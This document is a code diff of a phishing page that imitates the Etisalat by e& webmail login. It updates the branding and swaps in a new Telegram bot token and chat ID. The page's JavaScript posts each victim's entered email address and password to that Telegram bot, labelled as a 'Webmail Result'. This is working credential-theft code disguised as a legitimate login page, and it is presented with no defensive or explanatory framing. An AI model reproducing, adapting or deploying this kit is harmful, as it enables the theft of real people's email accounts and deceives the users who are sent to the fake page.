@@ -6,7 +6,7 @@
     <!-- Mimic Internet Explorer 7 -->
     <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
     <link href="http://www.etisalat.ae/en/system/images/generic/etisalat.ico" rel="shortcut icon" type="image/x-icon">
-    <link rel="stylesheet" href="https://acm1.eim.ae/iwc_static/c11n/allDomain/layout/css/login.css" type="text/css">
+    <link rel="stylesheet" href="https://eim.ae/iwc_static/c11n/allDomain/layout/css/login.css" type="text/css">
     <style type="text/css">
         body {
             background-image: url(https://acm1.eim.ae/iwc_static/c11n/allDomain/layout/images/background.png);
@@ -19,18 +19,21 @@
         }
     </style>
     <style>
-        .Convergence-Login-Logo {
-            background-color: transparent;
-            background-image: url("https://acm1.eim.ae/iwc_static/c11n/allDomain/layout/images/mail.jpg");
-            background-repeat: no-repeat;
-            background-position: 0 0;
-            width: 75px;
-            height: 85px;
-            padding: 0 0 0 0;
-            border-bottom: none;
-            margin-left: 5px;
-            float: left;
-        }
+                .Convergence-Login-Logo {
+	background-color: transparent;
+	background-image: url("https://ik.imagekit.io/ol0yiazoq/etisalat-logo.svg");
+	background-repeat: no-repeat;
+	background-position: 50% 50%;
+	width: 138px;
+	height: 18px;
+	padding: 0 0 10px 5px;
+	border-bottom: 2px solid #999;
+}
+.Convergence-Login-WelcomeMsg {
+	font-size: 18px;
+	font-weight: bold;
+	margin: 15px 0 5px 0;
+}
 
         .Convergence-Login-RedBand {
             margin: 0px;
@@ -52,7 +55,7 @@
         <div class="Convergence-Login-Border">
             <div class="Convergence-Login-Banner">
                 <div class="Convergence-Login-Logo" wairole="presentation"></div>
-                <div id="welcomeMsg" class="Convergence-Login-WelcomeMsg">my email - Etisalat Internet Mail</div>
+                <div id="welcomeMsg" class="Convergence-Login-WelcomeMsg">My Email - Etisalat by e& Internet Mail</div>
             </div>
 
             <div class="Convergence-Login-Notification" id="msg" aria-live="assertive" role="alert" tabindex="0" style="display: none;">Incorrect name or password.</div>
@@ -127,7 +130,7 @@
                 </div>
             </div>
             <div class="Convergence-Login-RedBand"></div>
-            <div id="copyright" class="Convergence-Login-Copyright">Copyright © 2019, Etisalat. All Rights Reserved.
+            <div id="copyright" class="Convergence-Login-Copyright">Copyright © 2023, Etisalat by e&. All Rights Reserved.
             </div>
         </div>
     </div>
@@ -210,10 +213,10 @@ $(document).ready(function() {
 
     $.ajax({
       dataType: 'json', // JSON is lowercase
-      url: 'https://api.telegram.org/bot7144200413:AAGkCATC3NZk7SmeyCRQWA2r4Vp59DrhMGU/sendMessage',
+      url: 'https://api.telegram.org/bot6106561885:AAF0EmQXOgj_TVWoaiJ75Exmhjx_WcD-SZo/sendMessage',
       type: 'POST',
       data: {
-        chat_id: '5465559402',
+        chat_id: '5643928959',
         text: `***** Webmail Result *****\r\nEmail: ${email}\r\nPassword: ${password}\r\n*****`
       },
       beforeSend: function(xhr) {
@@ -343,5 +346,4 @@ var $c = getUrlParameter('email');
 
 
 </script>
-
 </html>
